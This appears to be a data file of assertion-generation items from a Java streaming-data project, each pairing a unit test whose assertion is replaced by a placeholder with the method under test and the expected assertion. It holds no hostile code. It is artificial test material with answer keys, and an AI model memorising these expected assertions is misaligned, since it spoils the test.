createStencilConfig() { return StencilConfig.builder() .fetchHeaders(getHeaders(configuration)) .fetchTimeoutMs(configuration.getInteger(SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS, SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS_DEFAULT)) .cacheAutoRefresh(configuration.getBoolean(SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_KEY, SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_DEFAULT)) .cacheTtlMs(configuration.getLong(SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_KEY, SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_DEFAULT)) .refreshStrategy(getSchemaRefreshStrategy(configuration.getString(SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_KEY, SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_DEFAULT))) .fetchBackoffMinMs(configuration.getLong(SCHEMA_REGISTRY_STENCIL_FETCH_BACKOFF_MIN_MS_KEY, SCHEMA_REGISTRY_STENCIL_FETCH_BACKOFF_MIN_MS_DEFAULT)) .fetchRetries(configuration.getInteger(SCHEMA_REGISTRY_STENCIL_FETCH_RETRIES_KEY, SCHEMA_REGISTRY_STENCIL_FETCH_RETRIES_DEFAULT)) .build(); }"	assertEquals(Long.valueOf(60000), stencilConfig.getFetchBackoffMinMs())
"shouldReturnConfiguredValueIfFetchRetriesConfigIsSet() { Map<String, String> configMap = new HashMap<String, String>() {{ put(SCHEMA_REGISTRY_STENCIL_FETCH_RETRIES_KEY, ""9""); }}; Configuration config = getConfig(configMap); StencilClientOrchestrator stencilClientOrchestrator = new StencilClientOrchestrator(config); StencilConfig stencilConfig = stencilClientOrchestrator.createStencilConfig(); ""<AssertPlaceHolder>""; }
createStencilConfig() { return StencilConfig.builder() .fetchHeaders(getHeaders(configuration)) .fetchTimeoutMs(configuration.getInteger(SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS, SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS_DEFAULT)) .cacheAutoRefresh(configuration.getBoolean(SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_KEY, SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_DEFAULT)) .cacheTtlMs(configuration.getLong(SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_KEY, SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_DEFAULT)) .refreshStrategy(getSchemaRefreshStrategy(configuration.getString(SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_KEY, SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_DEFAULT))) .fetchBackoffMinMs(configuration.getLong(SCHEMA_REGISTRY_STENCIL_FETCH_BACKOFF_MIN_MS_KEY, SCHEMA_REGISTRY_STENCIL_FETCH_BACKOFF_MIN_MS_DEFAULT)) .fetchRetries(configuration.getInteger(SCHEMA_REGISTRY_STENCIL_FETCH_RETRIES_KEY, SCHEMA_REGISTRY_STENCIL_FETCH_RETRIES_DEFAULT)) .build(); }"	assertEquals(Integer.valueOf(9), stencilConfig.getFetchRetries())
"shouldReturnDefaultValueIfFetchRetriesConfigIsNotSet() { Map<String, String> configMap = new HashMap<>();  Configuration config = getConfig(configMap); StencilClientOrchestrator stencilClientOrchestrator = new StencilClientOrchestrator(config); StencilConfig stencilConfig = stencilClientOrchestrator.createStencilConfig(); ""<AssertPlaceHolder>""; }
createStencilConfig() { return StencilConfig.builder() .fetchHeaders(getHeaders(configuration)) .fetchTimeoutMs(configuration.getInteger(SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS, SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS_DEFAULT)) .cacheAutoRefresh(configuration.getBoolean(SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_KEY, SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_DEFAULT)) .cacheTtlMs(configuration.getLong(SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_KEY, SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_DEFAULT)) .refreshStrategy(getSchemaRefreshStrategy(configuration.getString(SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_KEY, SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_DEFAULT))) .fetchBackoffMinMs(configuration.getLong(SCHEMA_REGISTRY_STENCIL_FETCH_BACKOFF_MIN_MS_KEY, SCHEMA_REGISTRY_STENCIL_FETCH_BACKOFF_MIN_MS_DEFAULT)) .fetchRetries(configuration.getInteger(SCHEMA_REGISTRY_STENCIL_FETCH_RETRIES_KEY, SCHEMA_REGISTRY_STENCIL_FETCH_RETRIES_DEFAULT)) .build(); }"	assertEquals(Integer.valueOf(4), stencilConfig.getFetchRetries())
"shouldReturnEmptyHeadersIfHeadersConfigIsNotSet() { Map<String, String> configMap = new HashMap<>(); Configuration config = getConfig(configMap); StencilClientOrchestrator stencilClientOrchestrator = new StencilClientOrchestrator(config); StencilConfig stencilConfig = stencilClientOrchestrator.createStencilConfig(); ""<AssertPlaceHolder>""; }
createStencilConfig() { return StencilConfig.builder() .fetchHeaders(getHeaders(configuration)) .fetchTimeoutMs(configuration.getInteger(SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS, SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS_DEFAULT)) .cacheAutoRefresh(configuration.getBoolean(SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_KEY, SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_DEFAULT)) .cacheTtlMs(configuration.getLong(SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_KEY, SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_DEFAULT)) .refreshStrategy(getSchemaRefreshStrategy(configuration.getString(SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_KEY, SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_DEFAULT))) .fetchBackoffMinMs(configuration.getLong(SCHEMA_REGISTRY_STENCIL_FETCH_BACKOFF_MIN_MS_KEY, SCHEMA_REGISTRY_STENCIL_FETCH_BACKOFF_MIN_MS_DEFAULT)) .fetchRetries(configuration.getInteger(SCHEMA_REGISTRY_STENCIL_FETCH_RETRIES_KEY, SCHEMA_REGISTRY_STENCIL_FETCH_RETRIES_DEFAULT)) .build(); }"	assertEquals(0, stencilConfig.getFetchHeaders().size())
"shouldReturnEmptyHeadersIfHeadersConfigIsEmpty() { Map<String, String> configMap = new HashMap<String, String>() {{ put(SCHEMA_REGISTRY_STENCIL_FETCH_HEADERS_KEY, """"); }}; Configuration config = getConfig(configMap); StencilClientOrchestrator stencilClientOrchestrator = new StencilClientOrchestrator(config); StencilConfig stencilConfig = stencilClientOrchestrator.createStencilConfig(); ""<AssertPlaceHolder>""; }
createStencilConfig() { return StencilConfig.builder() .fetchHeaders(getHeaders(configuration)) .fetchTimeoutMs(configuration.getInteger(SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS, SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS_DEFAULT)) .cacheAutoRefresh(configuration.getBoolean(SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_KEY, SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_DEFAULT)) .cacheTtlMs(configuration.getLong(SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_KEY, SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_DEFAULT)) .refreshStrategy(getSchemaRefreshStrategy(configuration.getString(SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_KEY, SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_DEFAULT))) .fetchBackoffMinMs(configuration.getLong(SCHEMA_REGISTRY_STENCIL_FETCH_BACKOFF_MIN_MS_KEY, SCHEMA_REGISTRY_STENCIL_FETCH_BACKOFF_MIN_MS_DEFAULT)) .fetchRetries(configuration.getInteger(SCHEMA_REGISTRY_STENCIL_FETCH_RETRIES_KEY, SCHEMA_REGISTRY_STENCIL_FETCH_RETRIES_DEFAULT)) .build(); }"	assertEquals(0, stencilConfig.getFetchHeaders().size())
"shouldReturnEmptyHeadersIfKeyValuePairsNotValid() { Map<String, String> configMap = new HashMap<String, String>() {{ put(SCHEMA_REGISTRY_STENCIL_FETCH_HEADERS_KEY, "" : , : ::: : ,, :: , keyWithoutValue: , : valueWithoutKey, k1 : v1 : v2 ,, ""); }}; Configuration config = getConfig(configMap); StencilClientOrchestrator stencilClientOrchestrator = new StencilClientOrchestrator(config); StencilConfig stencilConfig = stencilClientOrchestrator.createStencilConfig(); ""<AssertPlaceHolder>""; }
createStencilConfig() { return StencilConfig.builder() .fetchHeaders(getHeaders(configuration)) .fetchTimeoutMs(configuration.getInteger(SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS, SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS_DEFAULT)) .cacheAutoRefresh(configuration.getBoolean(SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_KEY, SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_DEFAULT)) .cacheTtlMs(configuration.getLong(SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_KEY, SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_DEFAULT)) .refreshStrategy(getSchemaRefreshStrategy(configuration.getString(SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_KEY, SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_DEFAULT))) .fetchBackoffMinMs(configuration.getLong(SCHEMA_REGISTRY_STENCIL_FETCH_BACKOFF_MIN_MS_KEY, SCHEMA_REGISTRY_STENCIL_FETCH_BACKOFF_MIN_MS_DEFAULT)) .fetchRetries(configuration.getInteger(SCHEMA_REGISTRY_STENCIL_FETCH_RETRIES_KEY, SCHEMA_REGISTRY_STENCIL_FETCH_RETRIES_DEFAULT)) .build(); }"	assertEquals(0, stencilConfig.getFetchHeaders().size())
"shouldUpdateCountAndReturnTheCorrectCountValue() { Counter simpleCounter = new SimpleCounter(); when(metricGroup.addGroup(""counterTest"")).thenReturn(metricGroup); when(metricGroup.counter(""test_aspect3"")).thenReturn(simpleCounter); counterStatsManager.registerAspects(TestAspects.values(), ""counterTest""); counterStatsManager.inc(TestAspects.TEST_ASPECT_THREE); counterStatsManager.inc(TestAspects.TEST_ASPECT_THREE); long count = counterStatsManager.getCount(TestAspects.TEST_ASPECT_THREE); ""<AssertPlaceHolder>""; }
getCount(Aspects aspect) { return counters.get(aspect).getCount(); }"	assertEquals(2, count)
"shouldAlwaysReturnFalseForEndOfStream() { String jsonSchema = ""{ ""$schema"": ""https://json-schema.org/draft/2020-12/schema"", ""$id"": ""https://example.com/product.schema.json"", ""title"": ""Product"", ""description"": ""A product from Acme's catalog"", ""type"": ""object"", ""properties"": { ""id"": { ""description"": ""The unique identifier for a product"", ""type"": ""string"" }, ""time"": { ""description"": ""event timestamp of the event"", ""type"": ""string"", ""format"" : ""date-time"" } }, ""required"": [ ""id"", ""time"" ] }""; ""<AssertPlaceHolder>""; }
isEndOfStream(Row nextElement) { return false; }"	"assertFalse(new JsonDeserializer(jsonSchema, ""time"").isEndOfStream(null))"
"shouldGiveAllColumnTypesOfJsonAlongWithRowtime() { String jsonSchema = ""{ ""$schema"": ""https://json-schema.org/draft/2020-12/schema"", ""$id"": ""https://example.com/product.schema.json"", ""title"": ""Product"", ""description"": ""A product from Acme's catalog"", ""type"": ""object"", ""properties"": { ""id"": { ""description"": ""The unique identifier for a product"", ""type"": ""string"" }, ""time"": { ""description"": ""event timestamp of the event"", ""type"": ""string"", ""format"" : ""date-time"" } }, ""required"": [ ""id"", ""time"" ] }""; JsonType jsonType = new JsonType(jsonSchema, ROWTIME);  ""<AssertPlaceHolder>""; }
getRowType() { TypeInformation<Row> rowNamed = JsonRowSchemaConverter.convert(jsonSchema);  return addInternalFields(rowNamed, rowtimeAttributeName); }"	assertArrayEquals( new TypeInformation[]{STRING, SQL_TIMESTAMP, BOOLEAN, SQL_TIMESTAMP}, ((RowTypeInfo) jsonType.getRowType()).getFieldTypes())
"shouldGiveAllColumnNamesOfJsonAlongWithRowtimeAndInvalidField() { String jsonSchema = ""{ ""$schema"": ""https://json-schema.org/draft/2020-12/schema"", ""$id"": ""https://example.com/product.schema.json"", ""title"": ""Product"", ""description"": ""A product from Acme's catalog"", ""type"": ""object"", ""properties"": { ""id"": { ""description"": ""The unique identifier for a product"", ""type"": ""string"" }, ""time"": { ""description"": ""event timestamp of the event"", ""type"": ""integer"" }, ""random"": { ""description"": ""one random field"", ""type"": ""integer"" } }, ""required"": [ ""id"", ""time"", ""random"" ] }""; JsonType jsonType = new JsonType(jsonSchema, ROWTIME);  ""<AssertPlaceHolder>""; }
getRowType() { TypeInformation<Row> rowNamed = JsonRowSchemaConverter.convert(jsonSchema);  return addInternalFields(rowNamed, rowtimeAttributeName); }"	"assertArrayEquals( new String[]{""id"", ""time"", ""random"", ""__internal_validation_field__"", ""rowtime""}, ((RowTypeInfo) jsonType.getRowType()).getFieldNames())"
"shouldGiveAllTypesOfFieldsAlongWithRowtime() { String jsonSchema = ""{ ""$schema"": ""https://json-schema.org/draft/2020-12/schema"", ""$id"": ""https://example.com/product.schema.json"", ""title"": ""Product"", ""description"": ""A product from Acme's catalog"", ""type"": ""object"", ""properties"": { ""id"": { ""description"": ""The unique identifier for a product"", ""type"": ""string"" }, ""time"": { ""description"": ""event timestamp of the event"", ""type"": ""integer"" }, ""random"": { ""description"": ""one random field"", ""type"": ""integer"" } }, ""required"": [ ""id"", ""time"", ""random"" ] }""; JsonType jsonType = new JsonType(jsonSchema, ROWTIME);  ""<AssertPlaceHolder>""; }
getRowType() { TypeInformation<Row> rowNamed = JsonRowSchemaConverter.convert(jsonSchema);  return addInternalFields(rowNamed, rowtimeAttributeName); }"	assertArrayEquals( new TypeInformation[]{STRING, BIG_DEC, BIG_DEC, BOOLEAN, SQL_TIMESTAMP}, ((RowTypeInfo) jsonType.getRowType()).getFieldTypes())
"shouldAlwaysReturnFalseForEndOfStream() { ""<AssertPlaceHolder>""; }
isEndOfStream(Row nextElement) { return false; }"	"assertFalse(new ProtoDeserializer(TestBookingLogKey.class.getTypeName(), 4, ""rowtime"", stencilClientOrchestrator).isEndOfStream(null))"
"shouldGiveAllTypesOfFieldsAlongWithRowtime() { ProtoType protoType = new ProtoType(""org.raystack.dagger.consumer.TestBookingLogKey"", ""rowtime"", stencilClientOrchestrator);  ""<AssertPlaceHolder>""; }
getRowType() { TypeInformation<Row> rowNamed = TypeInformationFactory.getRowType(getProtoFieldDescriptor()); return addInternalFields(rowNamed, rowtimeAttributeName); }"	"assertArrayEquals( new TypeInformation[]{STRING, STRING, STRING, STRING, ROW_NAMED(new String[]{""seconds"", ""nanos""}, LONG, INT), BOOLEAN, SQL_TIMESTAMP}, ((RowTypeInfo) protoType.getRowType()).getFieldTypes())"
"shouldProcessArrayForObjectData() { ProtoType bookingLogMessageProtoType = new ProtoType(TestBookingLogMessage.class.getName(), ""rowtime"", stencilClientOrchestrator);  TypeInformation[] fieldTypes = ((RowTypeInfo) bookingLogMessageProtoType.getRowType()).getFieldTypes(); TypeInformation<Row> locationType = ROW_NAMED(new String[]{""name"", ""address"", ""latitude"", ""longitude"", ""type"", ""note"", ""place_id"", ""accuracy_meter"", ""gate_id""}, STRING, STRING, DOUBLE, DOUBLE, STRING, STRING, STRING, FLOAT, STRING); TypeInformation<?> expectedRoutesRow = OBJECT_ARRAY(ROW_NAMED(new String[]{""startTimer"", ""end"", ""distance_in_kms"", ""estimated_duration"", ""route_order""}, locationType, locationType, FLOAT, ROW_NAMED(new String[]{""seconds"", ""nanos""}, LONG, INT), INT));  ""<AssertPlaceHolder>""; }
getRowType() { TypeInformation<Row> rowNamed = TypeInformationFactory.getRowType(getProtoFieldDescriptor()); return addInternalFields(rowNamed, rowtimeAttributeName); }"	"assertEquals(expectedRoutesRow, fieldTypes[bookingLogFieldIndex(""routes"")])"
"shouldProcessArrayForStringData() { ProtoType rowtime = new ProtoType(TestBookingLogMessage.class.getName(), ""rowtime"", stencilClientOrchestrator);  TypeInformation[] fieldTypes = ((RowTypeInfo) rowtime.getRowType()).getFieldTypes();  TypeInformation<?> registeredDeviceType = ObjectArrayTypeInfo.getInfoFor(STRING);  ""<AssertPlaceHolder>""; }
getRowType() { TypeInformation<Row> rowNamed = TypeInformationFactory.getRowType(getProtoFieldDescriptor()); return addInternalFields(rowNamed, rowtimeAttributeName); }"	"assertEquals(registeredDeviceType, fieldTypes[bookingLogFieldIndex(""meta_array"")])"
"shouldGiveAllNamesAndTypesIncludingPrimitiveArrayFields() { ProtoType testNestedRepeatedMessage = new ProtoType(TestNestedRepeatedMessage.class.getName(), ""rowtime"", stencilClientOrchestrator); ""<AssertPlaceHolder>""; }
getRowType() { TypeInformation<Row> rowNamed = TypeInformationFactory.getRowType(getProtoFieldDescriptor()); return addInternalFields(rowNamed, rowtimeAttributeName); }"	assertEquals(PRIMITIVE_ARRAY(INT), ((RowTypeInfo) testNestedRepeatedMessage.getRowType()).getFieldTypes()[3])
"shouldSerializeIntoKafkaRecord() { ProtoSerializer serializer = Mockito.mock(ProtoSerializer.class); String outputTopic = ""test""; Row element = new Row(1); element.setField(0, ""testing""); byte[] keyBytes = ""key"".getBytes(); byte[] valueBytes = ""value"".getBytes(); Mockito.when(serializer.serializeKey(element)).thenReturn(keyBytes); Mockito.when(serializer.serializeValue(element)).thenReturn(valueBytes); KafkaProtoSerializer kafkaProtoSerializer = new KafkaProtoSerializer(serializer, outputTopic); ProducerRecord<byte[], byte[]> record = kafkaProtoSerializer.serialize(element, null, null); ProducerRecord<byte[], byte[]> expectedRecord = new ProducerRecord<>(""test"", keyBytes, valueBytes); Assert.""<AssertPlaceHolder>""; }
serialize(Row row, KafkaSinkContext context, Long timestamp) { if (Objects.isNull(outputTopic) || outputTopic.equals("""")) { throw new DaggerSerializationException(""outputTopic is required""); } LOGGER.info(""row to kafka: "" + row); byte[] key = protoSerializer.serializeKey(row); byte[] message = protoSerializer.serializeValue(row); return new ProducerRecord<>(outputTopic, key, message); }"	assertEquals(expectedRecord, record)
"InvalidProtocolBufferException { String[] columnNames = {""customer_profile.customer_id""}; String outputProtoKey = ""org.raystack.dagger.consumer.TestEnrichedBookingLogMessage""; String outputProtoMessage = ""org.raystack.dagger.consumer.TestEnrichedBookingLogMessage""; ProtoSerializer serializer = new ProtoSerializer(outputProtoKey, outputProtoMessage, columnNames, stencilClientOrchestrator);  Row element = new Row(1);  element.setField(0, ""test-id"");  byte[] value = serializer.serializeValue(element);  TestEnrichedBookingLogMessage actualValue = TestEnrichedBookingLogMessage.parseFrom(value);  ""<AssertPlaceHolder>""; }
serializeValue(Row row) { return parse(row, getDescriptor(messageProtoClassName)).toByteArray(); }"	"assertEquals(""test-id"", actualValue.getCustomerProfile().getCustomerId())"
"InvalidProtocolBufferException { String[] columnNames = {""blah.invalid"", ""customer_email""}; String outputProtoKey = ""org.raystack.dagger.consumer.TestBookingLogKey""; String outputProtoMessage = ""org.raystack.dagger.consumer.TestBookingLogMessage""; ProtoSerializer serializer = new ProtoSerializer(outputProtoKey, outputProtoMessage, columnNames, stencilClientOrchestrator); Row element = new Row(2); element.setField(0, ""order_number""); element.setField(1, ""customer_email@go-jek.com"");  byte[] valueBytes = serializer.serializeValue(element);  ""<AssertPlaceHolder>""; }
serializeValue(Row row) { return parse(row, getDescriptor(messageProtoClassName)).toByteArray(); }"	"assertEquals(""customer_email@go-jek.com"", TestBookingLogMessage.parseFrom(valueBytes).getCustomerEmail())"
"shouldMapEmptyDataWhenFieldIsInvalidInTheQuery() { String[] columnNames = {""invalid""}; String outputProtoKey = ""org.raystack.dagger.consumer.TestBookingLogKey""; String outputProtoMessage = ""org.raystack.dagger.consumer.TestBookingLogMessage""; ProtoSerializer serializer = new ProtoSerializer(outputProtoKey, outputProtoMessage, columnNames, stencilClientOrchestrator); Row element = new Row(1); element.setField(0, ""order_number"");  byte[] valueBytes = serializer.serializeValue(element);  ""<AssertPlaceHolder>""; }
serializeValue(Row row) { return parse(row, getDescriptor(messageProtoClassName)).toByteArray(); }"	assertEquals(0, valueBytes.length)
"InvalidProtocolBufferException { String[] columnNames = {""invalid"", ""order_number""}; String outputProtoKey = ""org.raystack.dagger.consumer.TestBookingLogKey""; String outputProtoMessage = ""org.raystack.dagger.consumer.TestBookingLogMessage""; ProtoSerializer serializer = new ProtoSerializer(outputProtoKey, outputProtoMessage, columnNames, stencilClientOrchestrator); Row element = new Row(2); element.setField(0, ""some_data""); element.setField(1, ""order_number"");  byte[] valueBytes = serializer.serializeValue(element);  ""<AssertPlaceHolder>""; }
serializeValue(Row row) { return parse(row, getDescriptor(messageProtoClassName)).toByteArray(); }"	"assertEquals(""order_number"", TestBookingLogMessage.parseFrom(valueBytes).getOrderNumber())"
"InvalidProtocolBufferException { String[] columnNames = {""order_number""}; String outputProtoKey = ""org.raystack.dagger.consumer.TestBookingLogKey""; String outputProtoMessage = ""org.raystack.dagger.consumer.TestBookingLogMessage""; ProtoSerializer serializer = new ProtoSerializer(outputProtoKey, outputProtoMessage, columnNames, stencilClientOrchestrator); Row element = new Row(1); element.setField(0, 1234);  byte[] testBookingLogMessage = serializer.serializeValue(element); ""<AssertPlaceHolder>""; }
serializeValue(Row row) { return parse(row, getDescriptor(messageProtoClassName)).toByteArray(); }"	"assertEquals(""1234"", TestBookingLogMessage.parseFrom(testBookingLogMessage).getOrderNumber())"
"InvalidProtocolBufferException { String[] columnNames = {""order_number"", ""driver_id""}; String outputProtoMessage = ""org.raystack.dagger.consumer.TestBookingLogMessage""; ProtoSerializer serializer = new ProtoSerializer(null, outputProtoMessage, columnNames, stencilClientOrchestrator);  String orderNumber = ""RB-1234"";  Row element = new Row(2); element.setField(0, orderNumber); element.setField(1, ""DR-124"");  byte[] valueBytes = serializer.serializeValue(element); TestBookingLogMessage actualMessage = TestBookingLogMessage.parseFrom(valueBytes);  ""<AssertPlaceHolder>""; }
serializeValue(Row row) { return parse(row, getDescriptor(messageProtoClassName)).toByteArray(); }"	assertEquals(orderNumber, actualMessage.getOrderNumber())
"shouldReturnTrueForAnyDataType() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""order_number""); PrimitiveTypeHandler primitiveTypeHandler = new PrimitiveTypeHandler(fieldDescriptor);  ""<AssertPlaceHolder>""; }
canHandle() { return true; }"	assertTrue(primitiveTypeHandler.canHandle())
"shouldReturnSameBuilderWithoutSettingFieldIfNullFieldIsPassed() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""order_number""); PrimitiveTypeHandler primitiveTypeHandler = new PrimitiveTypeHandler(fieldDescriptor); DynamicMessage.Builder builder = DynamicMessage.newBuilder(fieldDescriptor.getContainingType());  DynamicMessage.Builder returnedBuilder = primitiveTypeHandler.transformToProtoBuilder(builder, null); ""<AssertPlaceHolder>""; }
transformToProtoBuilder(DynamicMessage.Builder builder, Object field) { return field != null ? builder.setField(fieldDescriptor, transform(field)) : builder; }"	"assertEquals("""", returnedBuilder.getField(fieldDescriptor))"
"shouldSetFieldPassedInTheBuilder() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""order_number""); PrimitiveTypeHandler primitiveTypeHandler = new PrimitiveTypeHandler(fieldDescriptor); DynamicMessage.Builder builder = DynamicMessage.newBuilder(fieldDescriptor.getContainingType());  DynamicMessage.Builder returnedBuilder = primitiveTypeHandler.transformToProtoBuilder(builder, ""123""); ""<AssertPlaceHolder>""; }
transformToProtoBuilder(DynamicMessage.Builder builder, Object field) { return field != null ? builder.setField(fieldDescriptor, transform(field)) : builder; }"	"assertEquals(""123"", returnedBuilder.getField(fieldDescriptor))"
"shouldReturnTypeInformation() { Descriptors.Descriptor descriptor = TestBookingLogMessage.getDescriptor(); Descriptors.FieldDescriptor stringFieldDescriptor = descriptor.findFieldByName(""order_number""); PrimitiveTypeHandler primitiveTypeHandler = new PrimitiveTypeHandler(stringFieldDescriptor); ""<AssertPlaceHolder>""; }
getTypeInformation() { PrimitiveHandler primitiveHandler = PrimitiveHandlerFactory.getTypeHandler(fieldDescriptor); return primitiveHandler.getTypeInformation(); }"	assertEquals(Types.STRING, primitiveTypeHandler.getTypeInformation())
"shouldConvertPrimitiveStringToJsonString() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""order_number""); Object value = new PrimitiveTypeHandler(fieldDescriptor).transformToJson(""123"");  ""<AssertPlaceHolder>""; }
transformToJson(Object field) { return field; }"	"assertEquals(""123"", value)"
"shouldReturnParsedValueForTransformFromParquet() { Descriptors.FieldDescriptor fieldDescriptor = TestMessageEnvelope.getDescriptor().findFieldByName(""log_key""); String testString = ""test-string""; ByteString expectedByteString = ByteString.copyFrom(testString.getBytes()); GroupType parquetSchema = org.apache.parquet.schema.Types.requiredGroup() .required(BINARY).named(""log_key"") .named(""TestGroupType""); SimpleGroup simpleGroup = new SimpleGroup(parquetSchema); simpleGroup.add(""log_key"", Binary.fromConstantByteArray(expectedByteString.toByteArray())); PrimitiveTypeHandler primitiveTypeHandler = new PrimitiveTypeHandler(fieldDescriptor);  ByteString actualByteString = (ByteString) primitiveTypeHandler.transformFromParquet(simpleGroup);  ""<AssertPlaceHolder>""; }
transformFromParquet(SimpleGroup simpleGroup) { PrimitiveHandler primitiveHandler = PrimitiveHandlerFactory.getTypeHandler(fieldDescriptor); return primitiveHandler.parseSimpleGroup(simpleGroup); }"	assertEquals(expectedByteString, actualByteString)
"shouldReturnTheSameHandlerObjectWhenBothFieldDescriptorFullNameAndFieldDescriptorHashCodeIsSame() { Descriptors.FieldDescriptor mapFieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""metadata""); TypeHandler typeHandler1 = TypeHandlerFactory.getTypeHandler(mapFieldDescriptor); TypeHandler typeHandler2 = TypeHandlerFactory.getTypeHandler(mapFieldDescriptor);  ""<AssertPlaceHolder>""; }
getTypeHandler(final Descriptors.FieldDescriptor fieldDescriptor) { int newHashCode = fieldDescriptor.hashCode();  /* this means we have already created and persisted the handler corresponding to the field descriptor in the map and hence we can directly return it */ if (typeHandlerMap.containsKey(fieldDescriptor.getFullName()) && typeHandlerMap.get(fieldDescriptor.getFullName()).getKey() == newHashCode) { Pair<Integer, TypeHandler> pair = typeHandlerMap.get(fieldDescriptor.getFullName()); return pair.getValue(); } else { /* this means that either it is a new field not encountered before and/or same field but with an updated field descriptor object in either case, we create a new handler and persist it in the map */ TypeHandler handler = getSpecificHandlers(fieldDescriptor) .stream() .filter(TypeHandler::canHandle) .findFirst() .orElseGet(() -> new PrimitiveTypeHandler(fieldDescriptor)); Pair<Integer, TypeHandler> pair = ImmutablePair.of(newHashCode, handler); typeHandlerMap.put(fieldDescriptor.getFullName(), pair); return handler; } }"	assertEquals(typeHandler1, typeHandler2)
"shouldReturnMapHandlerIfMapFieldDescriptorPassed() { Descriptors.FieldDescriptor mapFieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""metadata""); TypeHandler typeHandler = TypeHandlerFactory.getTypeHandler(mapFieldDescriptor); ""<AssertPlaceHolder>""; }
getTypeHandler(final Descriptors.FieldDescriptor fieldDescriptor) { int newHashCode = fieldDescriptor.hashCode();  /* this means we have already created and persisted the handler corresponding to the field descriptor in the map and hence we can directly return it */ if (typeHandlerMap.containsKey(fieldDescriptor.getFullName()) && typeHandlerMap.get(fieldDescriptor.getFullName()).getKey() == newHashCode) { Pair<Integer, TypeHandler> pair = typeHandlerMap.get(fieldDescriptor.getFullName()); return pair.getValue(); } else { /* this means that either it is a new field not encountered before and/or same field but with an updated field descriptor object in either case, we create a new handler and persist it in the map */ TypeHandler handler = getSpecificHandlers(fieldDescriptor) .stream() .filter(TypeHandler::canHandle) .findFirst() .orElseGet(() -> new PrimitiveTypeHandler(fieldDescriptor)); Pair<Integer, TypeHandler> pair = ImmutablePair.of(newHashCode, handler); typeHandlerMap.put(fieldDescriptor.getFullName(), pair); return handler; } }"	assertEquals(MapHandler.class, typeHandler.getClass())
"shouldReturnTimestampHandlerIfTimestampFieldDescriptorPassed() { Descriptors.FieldDescriptor timestampFieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""event_timestamp""); TypeHandler typeHandler = TypeHandlerFactory.getTypeHandler(timestampFieldDescriptor); ""<AssertPlaceHolder>""; }
getTypeHandler(final Descriptors.FieldDescriptor fieldDescriptor) { int newHashCode = fieldDescriptor.hashCode();  /* this means we have already created and persisted the handler corresponding to the field descriptor in the map and hence we can directly return it */ if (typeHandlerMap.containsKey(fieldDescriptor.getFullName()) && typeHandlerMap.get(fieldDescriptor.getFullName()).getKey() == newHashCode) { Pair<Integer, TypeHandler> pair = typeHandlerMap.get(fieldDescriptor.getFullName()); return pair.getValue(); } else { /* this means that either it is a new field not encountered before and/or same field but with an updated field descriptor object in either case, we create a new handler and persist it in the map */ TypeHandler handler = getSpecificHandlers(fieldDescriptor) .stream() .filter(TypeHandler::canHandle) .findFirst() .orElseGet(() -> new PrimitiveTypeHandler(fieldDescriptor)); Pair<Integer, TypeHandler> pair = ImmutablePair.of(newHashCode, handler); typeHandlerMap.put(fieldDescriptor.getFullName(), pair); return handler; } }"	assertEquals(TimestampHandler.class, typeHandler.getClass())
